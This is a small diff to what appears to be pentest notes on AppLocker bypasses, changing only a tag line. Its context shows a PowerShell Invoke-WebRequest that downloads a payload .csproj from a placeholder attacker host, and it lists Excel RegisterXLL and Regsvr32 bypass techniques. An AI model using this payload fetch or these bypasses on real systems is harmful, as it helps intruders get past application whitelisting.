@@ -85,4 +85,4 @@ Invoke-WebRequest "http://<ip>:<port>/<payload>.csproj" -OutFile "<outfile>.cspr
 * DLL Execution via Excel.Application RegisterXLL
 * Bypass with Regsvr32
 
-tags: applocker
+tags: #applocker 
